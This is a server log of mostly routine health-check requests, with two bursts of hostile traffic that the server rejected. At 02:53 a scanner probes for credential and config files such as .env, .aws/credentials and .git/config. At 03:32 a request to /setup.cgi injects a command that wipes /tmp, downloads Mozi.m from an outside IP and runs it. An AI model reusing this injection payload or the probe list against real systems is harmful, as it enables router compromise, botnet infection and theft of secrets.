00:00:07.644 200 GET /api/health-check with 15 bytes took 2ms
00:00:37.878 200 GET /api/health-check with 15 bytes took 3ms
00:01:08.126 200 GET /api/health-check with 15 bytes took 1ms
00:01:38.402 200 GET /api/health-check with 15 bytes took 2ms
00:02:08.619 200 GET /api/health-check with 15 bytes took 2ms
00:02:38.874 Slow 200 GET /api/health-check with 15 bytes took 10ms
00:03:09.130 200 GET /api/health-check with 15 bytes took 4ms
00:03:39.415 200 GET /api/health-check with 15 bytes took 4ms
00:04:09.650 200 GET /api/health-check with 15 bytes took 1ms
00:04:39.908 200 GET /api/health-check with 15 bytes took 2ms
00:05:10.146 200 GET /api/health-check with 15 bytes took 1ms
00:05:40.426 200 GET /api/health-check with 15 bytes took 3ms
00:06:10.660 200 GET /api/health-check with 15 bytes took 1ms
00:06:40.936 200 GET /api/health-check with 15 bytes took 4ms
00:07:11.232 200 GET /api/health-check with 15 bytes took 2ms
00:07:41.466 200 GET /api/health-check with 15 bytes took 2ms
00:08:11.704 200 GET /api/health-check with 15 bytes took 5ms
00:08:41.932 200 GET /api/health-check with 15 bytes took 1ms
00:09:12.158 200 GET /api/health-check with 15 bytes took 2ms
00:09:42.432 200 GET /api/health-check with 15 bytes took 3ms
00:10:12.788 200 GET /api/health-check with 15 bytes took 3ms
00:10:43.014 200 GET /api/health-check with 15 bytes took 1ms
00:11:13.302 200 GET /api/health-check with 15 bytes took 2ms
00:11:43.563 200 GET /api/health-check with 15 bytes took 3ms
00:12:14.036 200 GET /api/health-check with 15 bytes took 6ms
00:12:44.332 200 GET /api/health-check with 15 bytes took 3ms
00:13:14.582 200 GET /api/health-check with 15 bytes took 2ms
00:13:44.833 200 GET /api/health-check with 15 bytes took 4ms
00:14:15.093 200 GET /api/health-check with 15 bytes took 2ms
00:14:45.354 200 GET /api/health-check with 15 bytes took 2ms
00:15:15.671 200 GET /api/health-check with 15 bytes took 2ms
00:15:45.952 200 GET /api/health-check with 15 bytes took 2ms
00:16:16.243 200 GET /api/health-check with 15 bytes took 2ms
00:16:46.551 200 GET /api/health-check with 15 bytes took 7ms
00:17:16.777 200 GET /api/health-check with 15 bytes took 3ms
00:17:47.160 200 GET /api/health-check with 15 bytes took 3ms
00:18:17.409 200 GET /api/health-check with 15 bytes took 1ms
00:18:47.633 200 GET /api/health-check with 15 bytes took 1ms
00:19:17.913 200 GET /api/health-check with 15 bytes took 3ms
00:19:48.188 200 GET /api/health-check with 15 bytes took 3ms
00:20:18.449 200 GET /api/health-check with 15 bytes took 3ms
00:20:48.669 200 GET /api/health-check with 15 bytes took 2ms
00:21:18.940 200 GET /api/health-check with 15 bytes took 3ms
00:21:49.180 200 GET /api/health-check with 15 bytes took 3ms
00:22:19.438 200 GET /api/health-check with 15 bytes took 2ms
00:22:49.702 200 GET /api/health-check with 15 bytes took 1ms
00:23:19.967 200 GET /api/health-check with 15 bytes took 8ms
00:23:50.192 200 GET /api/health-check with 15 bytes took 2ms
00:24:20.499 200 GET /api/health-check with 15 bytes took 2ms
00:24:50.735 200 GET /api/health-check with 15 bytes took 1ms
00:25:20.957 200 GET /api/health-check with 15 bytes took 2ms
00:25:51.273 Slow 200 GET /api/health-check with 15 bytes took 11ms
00:26:21.536 200 GET /api/health-check with 15 bytes took 2ms
00:26:51.801 200 GET /api/health-check with 15 bytes took 3ms
00:27:22.107 200 GET /api/health-check with 15 bytes took 2ms
00:27:52.363 200 GET /api/health-check with 15 bytes took 2ms
00:28:22.623 200 GET /api/health-check with 15 bytes took 2ms
00:28:52.933 200 GET /api/health-check with 15 bytes took 2ms
00:29:23.164 200 GET /api/health-check with 15 bytes took 2ms
00:29:53.446 200 GET /api/health-check with 15 bytes took 2ms
00:30:23.676 200 GET /api/health-check with 15 bytes took 2ms
00:30:54.075 200 GET /api/health-check with 15 bytes took 3ms
00:31:24.313 200 GET /api/health-check with 15 bytes took 3ms
00:31:54.558 200 GET /api/health-check with 15 bytes took 2ms
00:32:24.827 200 GET /api/health-check with 15 bytes took 2ms
00:32:55.075 200 GET /api/health-check with 15 bytes took 3ms
00:33:25.410 200 GET /api/health-check with 15 bytes took 2ms
00:33:55.633 200 GET /api/health-check with 15 bytes took 1ms
00:34:25.882 200 GET /api/health-check with 15 bytes took 2ms
00:34:56.186 200 GET /api/health-check with 15 bytes took 1ms
00:35:26.449 200 GET /api/health-check with 15 bytes took 5ms
00:35:56.701 200 GET /api/health-check with 15 bytes took 7ms
00:36:27.037 200 GET /api/health-check with 15 bytes took 5ms
00:36:57.256 200 GET /api/health-check with 15 bytes took 2ms
00:37:27.485 200 GET /api/health-check with 15 bytes took 1ms
00:37:57.734 200 GET /api/health-check with 15 bytes took 2ms
00:38:27.990 200 GET /api/health-check with 15 bytes took 2ms
00:38:58.254 200 GET /api/health-check with 15 bytes took 3ms
00:39:28.498 200 GET /api/health-check with 15 bytes took 2ms
00:39:58.757 200 GET /api/health-check with 15 bytes took 2ms
00:40:29.032 200 GET /api/health-check with 15 bytes took 2ms
00:40:59.275 200 GET /api/health-check with 15 bytes took 4ms
00:41:29.525 200 GET /api/health-check with 15 bytes took 2ms
00:41:59.776 200 GET /api/health-check with 15 bytes took 3ms
00:42:30.042 200 GET /api/health-check with 15 bytes took 2ms
00:43:00.401 200 GET /api/health-check with 15 bytes took 2ms
00:43:30.640 200 GET /api/health-check with 15 bytes took 5ms
00:44:00.892 200 GET /api/health-check with 15 bytes took 1ms
00:44:31.231 200 GET /api/health-check with 15 bytes took 3ms
00:45:01.586 200 GET /api/health-check with 15 bytes took 3ms
00:45:31.816 200 GET /api/health-check with 15 bytes took 6ms
00:46:02.127 200 GET /api/health-check with 15 bytes took 3ms
00:46:32.384 200 GET /api/health-check with 15 bytes took 2ms
00:47:02.622 200 GET /api/health-check with 15 bytes took 1ms
00:47:32.910 200 GET /api/health-check with 15 bytes took 4ms
00:48:03.223 200 GET /api/health-check with 15 bytes took 2ms
00:48:33.467 200 GET /api/health-check with 15 bytes took 1ms
00:49:03.735 200 GET /api/health-check with 15 bytes took 1ms
00:49:34.115 200 GET /api/health-check with 15 bytes took 6ms
00:50:04.390 200 GET /api/health-check with 15 bytes took 1ms
00:50:34.646 200 GET /api/health-check with 15 bytes took 2ms
00:51:04.919 200 GET /api/health-check with 15 bytes took 1ms
00:51:35.181 200 GET /api/health-check with 15 bytes took 2ms
00:52:05.434 200 GET /api/health-check with 15 bytes took 2ms
00:52:35.684 200 GET /api/health-check with 15 bytes took 3ms
00:53:05.949 200 GET /api/health-check with 15 bytes took 2ms
00:53:36.195 200 GET /api/health-check with 15 bytes took 2ms
00:54:06.446 200 GET /api/health-check with 15 bytes took 2ms
00:54:36.673 200 GET /api/health-check with 15 bytes took 2ms
00:55:06.997 200 GET /api/health-check with 15 bytes took 4ms
00:55:37.223 200 GET /api/health-check with 15 bytes took 2ms
00:56:07.572 200 GET /api/health-check with 15 bytes took 2ms
00:56:37.840 200 GET /api/health-check with 15 bytes took 3ms
00:57:08.104 200 GET /api/health-check with 15 bytes took 2ms
00:57:38.348 200 GET /api/health-check with 15 bytes took 1ms
00:58:08.568 200 GET /api/health-check with 15 bytes took 6ms
00:58:38.881 200 GET /api/health-check with 15 bytes took 2ms
00:59:09.157 200 GET /api/health-check with 15 bytes took 2ms
00:59:39.419 200 GET /api/health-check with 15 bytes took 2ms
01:00:09.641 200 GET /api/health-check with 15 bytes took 2ms
01:00:39.893 200 GET /api/health-check with 15 bytes took 2ms
01:01:10.166 Slow 200 GET /api/health-check with 15 bytes took 11ms
01:01:40.458 200 GET /api/health-check with 15 bytes took 3ms
01:02:10.672 200 GET /api/health-check with 15 bytes took 3ms
01:02:40.893 200 GET /api/health-check with 15 bytes took 3ms
01:03:11.181 200 GET /api/health-check with 15 bytes took 3ms
01:03:41.401 200 GET /api/health-check with 15 bytes took 1ms
01:04:11.663 200 GET /api/health-check with 15 bytes took 2ms
01:04:41.928 200 GET /api/health-check with 15 bytes took 3ms
01:05:12.184 200 GET /api/health-check with 15 bytes took 3ms
01:05:42.464 200 GET /api/health-check with 15 bytes took 2ms
01:06:12.769 200 GET /api/health-check with 15 bytes took 3ms
01:06:43.015 200 GET /api/health-check with 15 bytes took 1ms
01:07:13.330 200 GET /api/health-check with 15 bytes took 3ms
01:07:43.632 200 GET /api/health-check with 15 bytes took 3ms
01:08:13.987 200 GET /api/health-check with 15 bytes took 2ms
01:08:44.232 200 GET /api/health-check with 15 bytes took 2ms
01:09:14.507 200 GET /api/health-check with 15 bytes took 1ms
01:09:44.754 200 GET /api/health-check with 15 bytes took 2ms
01:10:14.992 200 GET /api/health-check with 15 bytes took 2ms
01:10:45.240 200 GET /api/health-check with 15 bytes took 8ms
01:11:15.480 200 GET /api/health-check with 15 bytes took 4ms
01:11:45.745 200 GET /api/health-check with 15 bytes took 3ms
01:12:15.973 200 GET /api/health-check with 15 bytes took 2ms
01:12:46.290 200 GET /api/health-check with 15 bytes took 1ms
01:13:16.517 200 GET /api/health-check with 15 bytes took 2ms
01:13:46.789 200 GET /api/health-check with 15 bytes took 2ms
01:14:17.050 200 GET /api/health-check with 15 bytes took 1ms
01:14:47.408 200 GET /api/health-check with 15 bytes took 2ms
01:15:17.643 200 GET /api/health-check with 15 bytes took 2ms
01:15:47.877 200 GET /api/health-check with 15 bytes took 3ms
01:16:18.136 200 GET /api/health-check with 15 bytes took 2ms
01:16:48.400 200 GET /api/health-check with 15 bytes took 2ms
01:17:18.729 200 GET /api/health-check with 15 bytes took 4ms
01:17:49.000 200 GET /api/health-check with 15 bytes took 5ms
01:18:19.315 200 GET /api/health-check with 15 bytes took 3ms
01:18:49.609 200 GET /api/health-check with 15 bytes took 1ms
01:19:19.932 200 GET /api/health-check with 15 bytes took 3ms
01:19:50.167 200 GET /api/health-check with 15 bytes took 1ms
01:20:20.422 200 GET /api/health-check with 15 bytes took 7ms
01:20:50.663 200 GET /api/health-check with 15 bytes took 2ms
01:21:20.959 200 GET /api/health-check with 15 bytes took 2ms
01:21:51.234 200 GET /api/health-check with 15 bytes took 1ms
01:22:21.490 200 GET /api/health-check with 15 bytes took 2ms
01:22:51.768 200 GET /api/health-check with 15 bytes took 2ms
01:23:22.033 200 GET /api/health-check with 15 bytes took 2ms
01:23:52.342 200 GET /api/health-check with 15 bytes took 2ms
01:24:22.574 200 GET /api/health-check with 15 bytes took 2ms
01:24:52.806 200 GET /api/health-check with 15 bytes took 3ms
01:25:23.044 200 GET /api/health-check with 15 bytes took 2ms
01:25:53.324 200 GET /api/health-check with 15 bytes took 1ms
01:26:23.577 200 GET /api/health-check with 15 bytes took 2ms
01:26:53.905 200 GET /api/health-check with 15 bytes took 2ms
01:27:24.147 200 GET /api/health-check with 15 bytes took 2ms
01:27:54.487 200 GET /api/health-check with 15 bytes took 3ms
01:28:24.746 200 GET /api/health-check with 15 bytes took 3ms
01:28:55.005 200 GET /api/health-check with 15 bytes took 4ms
01:29:25.276 200 GET /api/health-check with 15 bytes took 2ms
01:29:55.501 200 GET /api/health-check with 15 bytes took 1ms
01:30:25.774 200 GET /api/health-check with 15 bytes took 2ms
01:30:56.021 200 GET /api/health-check with 15 bytes took 3ms
01:31:26.329 200 GET /api/health-check with 15 bytes took 3ms
01:31:56.544 200 GET /api/health-check with 15 bytes took 2ms
01:32:26.808 200 GET /api/health-check with 15 bytes took 3ms
01:32:57.041 200 GET /api/health-check with 15 bytes took 2ms
01:33:27.370 200 GET /api/health-check with 15 bytes took 3ms
01:33:57.597 200 GET /api/health-check with 15 bytes took 1ms
01:34:27.849 200 GET /api/health-check with 15 bytes took 2ms
01:34:58.080 200 GET /api/health-check with 15 bytes took 1ms
01:35:28.332 200 GET /api/health-check with 15 bytes took 2ms
01:35:58.625 200 GET /api/health-check with 15 bytes took 1ms
01:36:28.876 200 GET /api/health-check with 15 bytes took 2ms
01:36:59.125 200 GET /api/health-check with 15 bytes took 8ms
01:37:29.397 200 GET /api/health-check with 15 bytes took 3ms
01:37:59.646 200 GET /api/health-check with 15 bytes took 2ms
01:38:29.889 200 GET /api/health-check with 15 bytes took 2ms
01:39:00.190 200 GET /api/health-check with 15 bytes took 2ms
01:39:30.447 200 GET /api/health-check with 15 bytes took 3ms
01:40:00.740 200 GET /api/health-check with 15 bytes took 2ms
01:40:31.039 200 GET /api/health-check with 15 bytes took 5ms
01:41:01.272 200 GET /api/health-check with 15 bytes took 2ms
01:41:31.542 200 GET /api/health-check with 15 bytes took 3ms
01:42:01.863 200 GET /api/health-check with 15 bytes took 3ms
01:42:32.108 200 GET /api/health-check with 15 bytes took 2ms
01:43:02.461 200 GET /api/health-check with 15 bytes took 4ms
01:43:32.722 Slow 200 GET /api/health-check with 15 bytes took 10ms
01:44:02.971 200 GET /api/health-check with 15 bytes took 2ms
01:44:33.216 200 GET /api/health-check with 15 bytes took 1ms
01:45:03.464 200 GET /api/health-check with 15 bytes took 3ms
01:45:33.854 200 GET /api/health-check with 15 bytes took 3ms
01:46:04.129 200 GET /api/health-check with 15 bytes took 3ms
01:46:34.373 200 GET /api/health-check with 15 bytes took 1ms
01:47:04.634 200 GET /api/health-check with 15 bytes took 3ms
01:47:34.870 200 GET /api/health-check with 15 bytes took 1ms
01:48:05.164 200 GET /api/health-check with 15 bytes took 4ms
01:48:35.399 200 GET /api/health-check with 15 bytes took 1ms
01:49:05.663 200 GET /api/health-check with 15 bytes took 2ms
01:49:35.907 200 GET /api/health-check with 15 bytes took 2ms
01:50:06.199 200 GET /api/health-check with 15 bytes took 3ms
01:50:36.455 200 GET /api/health-check with 15 bytes took 2ms
01:51:06.705 200 GET /api/health-check with 15 bytes took 2ms
01:51:36.932 200 GET /api/health-check with 15 bytes took 2ms
01:52:07.247 200 GET /api/health-check with 15 bytes took 3ms
01:52:37.484 200 GET /api/health-check with 15 bytes took 1ms
01:53:07.741 200 GET /api/health-check with 15 bytes took 6ms
01:53:38.026 200 GET /api/health-check with 15 bytes took 2ms
01:54:08.271 200 GET /api/health-check with 15 bytes took 3ms
01:54:38.575 200 GET /api/health-check with 15 bytes took 2ms
01:55:08.806 200 GET /api/health-check with 15 bytes took 1ms
01:55:39.078 200 GET /api/health-check with 15 bytes took 3ms
01:56:09.307 200 GET /api/health-check with 15 bytes took 2ms
01:56:39.583 200 GET /api/health-check with 15 bytes took 2ms
01:57:09.813 200 GET /api/health-check with 15 bytes took 1ms
01:57:40.081 200 GET /api/health-check with 15 bytes took 4ms
01:58:10.334 200 GET /api/health-check with 15 bytes took 2ms
01:58:40.606 200 GET /api/health-check with 15 bytes took 2ms
01:59:10.833 200 GET /api/health-check with 15 bytes took 2ms
01:59:41.077 200 GET /api/health-check with 15 bytes took 7ms
02:00:11.363 200 GET /api/health-check with 15 bytes took 5ms
02:00:41.606 200 GET /api/health-check with 15 bytes took 2ms
02:01:11.997 200 GET /api/health-check with 15 bytes took 4ms
02:01:42.265 200 GET /api/health-check with 15 bytes took 3ms
02:02:12.529 200 GET /api/health-check with 15 bytes took 2ms
02:02:42.786 200 GET /api/health-check with 15 bytes took 2ms
02:03:13.086 200 GET /api/health-check with 15 bytes took 2ms
02:03:43.338 200 GET /api/health-check with 15 bytes took 3ms
02:04:13.612 200 GET /api/health-check with 15 bytes took 1ms
02:04:43.835 200 GET /api/health-check with 15 bytes took 0ms
02:05:14.069 200 GET /api/health-check with 15 bytes took 5ms
02:05:44.327 200 GET /api/health-check with 15 bytes took 2ms
02:06:14.557 200 GET /api/health-check with 15 bytes took 2ms
02:06:44.808 200 GET /api/health-check with 15 bytes took 2ms
02:07:15.036 200 GET /api/health-check with 15 bytes took 1ms
02:07:45.296 200 GET /api/health-check with 15 bytes took 2ms
02:08:15.597 200 GET /api/health-check with 15 bytes took 3ms
02:08:45.912 200 GET /api/health-check with 15 bytes took 2ms
02:09:16.178 200 GET /api/health-check with 15 bytes took 7ms
02:09:46.474 200 GET /api/health-check with 15 bytes took 2ms
02:10:16.716 200 GET /api/health-check with 15 bytes took 3ms
02:10:47.011 200 GET /api/health-check with 15 bytes took 2ms
02:11:17.238 200 GET /api/health-check with 15 bytes took 2ms
02:11:47.553 200 GET /api/health-check with 15 bytes took 2ms
02:12:17.819 Slow 200 GET /api/health-check with 15 bytes took 11ms
02:12:48.072 200 GET /api/health-check with 15 bytes took 2ms
02:13:18.336 200 GET /api/health-check with 15 bytes took 2ms
02:13:48.608 200 GET /api/health-check with 15 bytes took 3ms
02:14:18.873 200 GET /api/health-check with 15 bytes took 3ms
02:14:49.142 200 GET /api/health-check with 15 bytes took 2ms
02:15:19.402 200 GET /api/health-check with 15 bytes took 3ms
02:15:49.675 200 GET /api/health-check with 15 bytes took 2ms
02:16:19.937 200 GET /api/health-check with 15 bytes took 2ms
02:16:50.183 200 GET /api/health-check with 15 bytes took 3ms
02:17:20.560 200 GET /api/health-check with 15 bytes took 1ms
02:17:50.803 200 GET /api/health-check with 15 bytes took 2ms
02:18:21.065 200 GET /api/health-check with 15 bytes took 2ms
02:18:51.328 200 GET /api/health-check with 15 bytes took 8ms
02:19:21.576 200 GET /api/health-check with 15 bytes took 4ms
02:19:51.871 200 GET /api/health-check with 15 bytes took 3ms
02:20:22.170 200 GET /api/health-check with 15 bytes took 2ms
02:20:52.449 200 GET /api/health-check with 15 bytes took 1ms
02:21:22.712 200 GET /api/health-check with 15 bytes took 2ms
02:21:53.007 200 GET /api/health-check with 15 bytes took 9ms
02:22:23.232 200 GET /api/health-check with 15 bytes took 2ms
02:22:53.489 200 GET /api/health-check with 15 bytes took 2ms
02:23:23.813 200 GET /api/health-check with 15 bytes took 2ms
02:23:54.099 200 GET /api/health-check with 15 bytes took 2ms
02:24:24.337 200 GET /api/health-check with 15 bytes took 3ms
02:24:54.561 200 GET /api/health-check with 15 bytes took 1ms
02:25:24.858 200 GET /api/health-check with 15 bytes took 3ms
02:25:55.144 200 GET /api/health-check with 15 bytes took 2ms
02:26:25.414 200 GET /api/health-check with 15 bytes took 3ms
02:26:55.706 200 GET /api/health-check with 15 bytes took 2ms
02:27:25.924 200 GET /api/health-check with 15 bytes took 2ms
02:27:56.176 200 GET /api/health-check with 15 bytes took 2ms
02:28:26.450 Slow 200 GET /api/health-check with 15 bytes took 10ms
02:28:56.678 200 GET /api/health-check with 15 bytes took 2ms
02:29:26.994 200 GET /api/health-check with 15 bytes took 3ms
02:29:57.222 200 GET /api/health-check with 15 bytes took 3ms
02:30:27.498 200 GET /api/health-check with 15 bytes took 2ms
02:30:57.730 200 GET /api/health-check with 15 bytes took 2ms
02:31:27.998 200 GET /api/health-check with 15 bytes took 3ms
02:31:58.265 200 GET /api/health-check with 15 bytes took 2ms
02:32:28.545 200 GET /api/health-check with 15 bytes took 2ms
02:32:58.824 200 GET /api/health-check with 15 bytes took 1ms
02:33:29.080 200 GET /api/health-check with 15 bytes took 3ms
02:33:59.334 200 GET /api/health-check with 15 bytes took 2ms
02:34:29.596 200 GET /api/health-check with 15 bytes took 0ms
02:34:59.895 200 GET /api/health-check with 15 bytes took 2ms
02:35:30.168 200 GET /api/health-check with 15 bytes took 1ms
02:36:00.561 200 GET /api/health-check with 15 bytes took 4ms
02:36:30.856 200 GET /api/health-check with 15 bytes took 5ms
02:37:01.148 200 GET /api/health-check with 15 bytes took 2ms
02:37:31.423 200 GET /api/health-check with 15 bytes took 2ms
02:38:01.674 200 GET /api/health-check with 15 bytes took 5ms
02:38:31.989 200 GET /api/health-check with 15 bytes took 2ms
02:39:02.334 200 GET /api/health-check with 15 bytes took 3ms
02:39:32.578 200 GET /api/health-check with 15 bytes took 3ms
02:40:02.896 200 GET /api/health-check with 15 bytes took 3ms
02:40:33.173 200 GET /api/health-check with 15 bytes took 2ms
02:41:03.444 200 GET /api/health-check with 15 bytes took 3ms
02:41:33.693 200 GET /api/health-check with 15 bytes took 2ms
02:42:03.995 200 GET /api/health-check with 15 bytes took 2ms
02:42:34.327 200 GET /api/health-check with 15 bytes took 2ms
02:43:04.565 200 GET /api/health-check with 15 bytes took 2ms
02:43:34.835 200 GET /api/health-check with 15 bytes took 3ms
02:44:05.112 200 GET /api/health-check with 15 bytes took 3ms
02:44:35.357 200 GET /api/health-check with 15 bytes took 2ms
02:45:05.616 200 GET /api/health-check with 15 bytes took 2ms
02:45:35.841 200 GET /api/health-check with 15 bytes took 1ms
02:46:06.141 200 GET /api/health-check with 15 bytes took 4ms
02:46:36.380 200 GET /api/health-check with 15 bytes took 3ms
02:47:06.655 200 GET /api/health-check with 15 bytes took 2ms
02:47:36.905 200 GET /api/health-check with 15 bytes took 1ms
02:48:07.239 200 GET /api/health-check with 15 bytes took 3ms
02:48:37.467 200 GET /api/health-check with 15 bytes took 2ms
02:49:07.762 200 GET /api/health-check with 15 bytes took 3ms
02:49:38.060 200 GET /api/health-check with 15 bytes took 2ms
02:50:08.324 200 GET /api/health-check with 15 bytes took 3ms
02:50:38.589 200 GET /api/health-check with 15 bytes took 4ms
02:51:08.849 200 GET /api/health-check with 15 bytes took 1ms
02:51:39.091 200 GET /api/health-check with 15 bytes took 2ms
02:52:09.431 200 GET /api/health-check with 15 bytes took 3ms
02:52:39.721 200 GET /api/health-check with 15 bytes took 2ms
02:53:09.959 200 GET /api/health-check with 15 bytes took 1ms
02:53:21.864 Error: Router not found for request GET /.git/HEAD
02:53:22.235 Error: Router not found for request GET /.git/config
02:53:22.666 Error: Router not found for request GET /.env
02:53:23.546 Error: Router not found for request GET /.env.local
02:53:24.599 Error: Router not found for request GET /.env.production
02:53:25.128 Error: Router not found for request GET /.env.backup
02:53:25.966 Error: Router not found for request GET /.env.save
02:53:26.794 Error: Router not found for request GET /wp-config.php
02:53:27.257 Error: Router not found for request GET /wp-config.php.bak
02:53:27.828 Error: Router not found for request GET /.aws/credentials
02:53:28.484 Error: Router not found for request GET /config/database.yml
02:53:29.312 Error: Router not found for request GET /phpinfo.php
02:53:30.007 Error: Router not found for request GET /server-status
02:53:30.326 Error: Router not found for request GET /actuator/env
02:53:30.905 Error: Router not found for request GET /.DS_Store
02:53:31.617 Error: Router not found for request GET /config.php
02:53:32.641 Error: Router not found for request GET /app/config/parameters.yml
02:53:33.626 Error: Router not found for request GET /.htpasswd
02:53:34.466 Error: Router not found for request GET /backup.sql
02:53:35.502 Error: Router not found for request GET /dump.sql
02:53:40.227 200 GET /api/health-check with 15 bytes took 1ms
02:54:05.371 Error: Router not found for request GET /geoserver/web/
02:54:10.474 200 GET /api/health-check with 15 bytes took 2ms
02:54:40.841 200 GET /api/health-check with 15 bytes took 2ms
02:55:11.123 Slow 200 GET /api/health-check with 15 bytes took 10ms
02:55:41.357 200 GET /api/health-check with 15 bytes took 1ms
02:56:11.649 200 GET /api/health-check with 15 bytes took 3ms
02:56:41.939 200 GET /api/health-check with 15 bytes took 2ms
02:57:12.248 200 GET /api/health-check with 15 bytes took 3ms
02:57:42.485 200 GET /api/health-check with 15 bytes took 3ms
02:58:12.781 200 GET /api/health-check with 15 bytes took 2ms
02:58:43.003 200 GET /api/health-check with 15 bytes took 1ms
02:59:13.282 200 GET /api/health-check with 15 bytes took 2ms
02:59:43.515 200 GET /api/health-check with 15 bytes took 2ms
03:00:13.828 200 GET /api/health-check with 15 bytes took 2ms
03:00:44.100 200 GET /api/health-check with 15 bytes took 1ms
03:01:14.461 200 GET /api/health-check with 15 bytes took 2ms
03:01:44.742 200 GET /api/health-check with 15 bytes took 2ms
03:02:15.000 200 GET /api/health-check with 15 bytes took 3ms
03:02:45.274 200 GET /api/health-check with 15 bytes took 2ms
03:03:15.501 200 GET /api/health-check with 15 bytes took 1ms
03:03:45.757 200 GET /api/health-check with 15 bytes took 1ms
03:04:15.991 200 GET /api/health-check with 15 bytes took 2ms
03:04:46.226 200 GET /api/health-check with 15 bytes took 2ms
03:05:16.471 200 GET /api/health-check with 15 bytes took 2ms
03:05:46.782 200 GET /api/health-check with 15 bytes took 3ms
03:06:17.002 200 GET /api/health-check with 15 bytes took 2ms
03:06:47.310 200 GET /api/health-check with 15 bytes took 3ms
03:07:17.588 200 GET /api/health-check with 15 bytes took 2ms
03:07:47.799 200 GET /api/health-check with 15 bytes took 2ms
03:08:18.060 200 GET /api/health-check with 15 bytes took 1ms
03:08:48.268 200 GET /api/health-check with 15 bytes took 1ms
03:09:18.533 200 GET /api/health-check with 15 bytes took 4ms
03:09:48.808 200 GET /api/health-check with 15 bytes took 2ms
03:10:19.057 200 GET /api/health-check with 15 bytes took 4ms
03:10:49.353 200 GET /api/health-check with 15 bytes took 1ms
03:11:19.622 200 GET /api/health-check with 15 bytes took 1ms
03:11:49.856 200 GET /api/health-check with 15 bytes took 1ms
03:12:20.178 200 GET /api/health-check with 15 bytes took 3ms
03:12:50.453 200 GET /api/health-check with 15 bytes took 1ms
03:13:20.837 200 GET /api/health-check with 15 bytes took 2ms
03:13:51.138 200 GET /api/health-check with 15 bytes took 4ms
03:14:21.418 200 GET /api/health-check with 15 bytes took 2ms
03:14:51.721 200 GET /api/health-check with 15 bytes took 4ms
03:15:21.985 200 GET /api/health-check with 15 bytes took 2ms
03:15:52.223 200 GET /api/health-check with 15 bytes took 3ms
03:16:22.505 200 GET /api/health-check with 15 bytes took 2ms
03:16:52.831 200 GET /api/health-check with 15 bytes took 2ms
03:17:23.097 200 GET /api/health-check with 15 bytes took 7ms
03:17:53.353 200 GET /api/health-check with 15 bytes took 2ms
03:18:23.587 200 GET /api/health-check with 15 bytes took 2ms
03:18:53.874 200 GET /api/health-check with 15 bytes took 2ms
03:19:24.125 200 GET /api/health-check with 15 bytes took 1ms
03:19:54.351 200 GET /api/health-check with 15 bytes took 2ms
03:20:24.630 200 GET /api/health-check with 15 bytes took 3ms
03:20:54.894 200 GET /api/health-check with 15 bytes took 2ms
03:21:25.216 200 GET /api/health-check with 15 bytes took 4ms
03:21:55.473 200 GET /api/health-check with 15 bytes took 1ms
03:22:25.707 200 GET /api/health-check with 15 bytes took 2ms
03:22:55.976 200 GET /api/health-check with 15 bytes took 2ms
03:23:26.240 200 GET /api/health-check with 15 bytes took 5ms
03:23:56.458 200 GET /api/health-check with 15 bytes took 2ms
03:24:26.721 200 GET /api/health-check with 15 bytes took 3ms
03:24:56.994 200 GET /api/health-check with 15 bytes took 2ms
03:25:27.353 200 GET /api/health-check with 15 bytes took 2ms
03:25:57.623 200 GET /api/health-check with 15 bytes took 2ms
03:26:27.874 200 GET /api/health-check with 15 bytes took 2ms
03:26:58.134 200 GET /api/health-check with 15 bytes took 4ms
03:27:28.397 200 GET /api/health-check with 15 bytes took 3ms
03:27:58.674 200 GET /api/health-check with 15 bytes took 3ms
03:28:28.993 200 GET /api/health-check with 15 bytes took 2ms
03:28:59.231 200 GET /api/health-check with 15 bytes took 8ms
03:29:29.465 200 GET /api/health-check with 15 bytes took 4ms
03:29:59.752 200 GET /api/health-check with 15 bytes took 8ms
03:30:30.003 200 GET /api/health-check with 15 bytes took 2ms
03:31:00.394 200 GET /api/health-check with 15 bytes took 2ms
03:31:30.617 200 GET /api/health-check with 15 bytes took 2ms
03:32:00.890 200 GET /api/health-check with 15 bytes took 2ms
03:32:12.250 Error: Router not found for request GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://175.107.233.6:39262/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
03:32:31.135 200 GET /api/health-check with 15 bytes took 3ms
03:33:01.399 200 GET /api/health-check with 15 bytes took 3ms
03:33:31.653 200 GET /api/health-check with 15 bytes took 3ms
03:34:01.912 200 GET /api/health-check with 15 bytes took 2ms
03:34:32.198 200 GET /api/health-check with 15 bytes took 2ms
03:35:02.489 200 GET /api/health-check with 15 bytes took 2ms
03:35:32.815 200 GET /api/health-check with 15 bytes took 3ms
03:36:03.074 200 GET /api/health-check with 15 bytes took 9ms
03:36:33.410 200 GET /api/health-check with 15 bytes took 4ms
03:37:03.695 200 GET /api/health-check with 15 bytes took 1ms
03:37:33.988 200 GET /api/health-check with 15 bytes took 3ms
03:38:04.267 200 GET /api/health-check with 15 bytes took 2ms
03:38:34.621 200 GET /api/health-check with 15 bytes took 6ms
03:39:04.938 200 GET /api/health-check with 15 bytes took 2ms
03:39:35.235 200 GET /api/health-check with 15 bytes took 1ms
03:40:05.575 200 GET /api/health-check with 15 bytes took 4ms
03:40:35.811 200 GET /api/health-check with 15 bytes took 3ms
03:41:06.124 200 GET /api/health-check with 15 bytes took 5ms
03:41:36.386 200 GET /api/health-check with 15 bytes took 3ms
03:42:06.692 200 GET /api/health-check with 15 bytes took 2ms
03:42:36.999 Slow 200 GET /api/health-check with 15 bytes took 13ms
03:43:07.292 200 GET /api/health-check with 15 bytes took 2ms
03:43:37.575 200 GET /api/health-check with 15 bytes took 5ms
03:44:08.031 200 GET /api/health-check with 15 bytes took 2ms
03:44:38.364 200 GET /api/health-check with 15 bytes took 2ms
03:45:08.675 200 GET /api/health-check with 15 bytes took 1ms
03:45:38.951 200 GET /api/health-check with 15 bytes took 2ms
03:46:09.215 200 GET /api/health-check with 15 bytes took 2ms
03:46:39.491 200 GET /api/health-check with 15 bytes took 2ms
03:47:09.715 200 GET /api/health-check with 15 bytes took 1ms
03:47:40.016 200 GET /api/health-check with 15 bytes took 2ms
03:48:10.295 200 GET /api/health-check with 15 bytes took 2ms
03:48:40.591 200 GET /api/health-check with 15 bytes took 3ms
03:49:10.840 200 GET /api/health-check with 15 bytes took 2ms
03:49:41.218 200 GET /api/health-check with 15 bytes took 3ms
03:50:11.442 200 GET /api/health-check with 15 bytes took 1ms
03:50:41.694 200 GET /api/health-check with 15 bytes took 1ms
03:51:11.952 200 GET /api/health-check with 15 bytes took 2ms
03:51:42.277 200 GET /api/health-check with 15 bytes took 2ms
